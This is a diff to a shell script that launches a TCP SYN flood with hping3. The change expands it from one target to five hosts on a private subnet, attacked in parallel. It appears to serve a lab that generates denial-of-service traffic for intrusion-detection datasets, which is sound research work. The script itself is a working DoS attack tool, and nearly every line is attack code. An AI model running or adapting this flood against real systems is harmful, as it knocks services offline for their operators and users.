@@ -1,9 +1,15 @@
 #!/bin/sh
-# syn_flood.sh — TCP SYN flood against victim_web (172.20.0.10:80)
-# Generates DoS-GoldenEye-style flows: high syn_flag_ratio, short duration.
-# -k keeps the same source port so all packets belong to one flow.
-TARGET=${1:-172.20.0.10}
-PORT=${2:-80}
-COUNT=${3:-10000}
-echo "[attack] SYN flood → $TARGET:$PORT  ($COUNT packets)"
-hping3 --syn -k -p "$PORT" -c "$COUNT" --faster "$TARGET"
+# syn_flood.sh — TCP SYN flood against all victim nodes.
+# Generates high syn_flag_ratio flows with short duration and zero response.
+# -k keeps the same source port so all packets per target belong to one flow.
+# All 5 nodes targeted in parallel — realistic subnet-wide DoS campaign.
+PORT=${1:-80}
+COUNT=${2:-10000}
+
+VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"
+
+echo "[attack] SYN flood -> all nodes  port $PORT  ($COUNT packets each)"
+for ip in $VICTIMS; do
+    hping3 --syn -k -p "$PORT" -c "$COUNT" --faster "$ip" &
+done
+wait
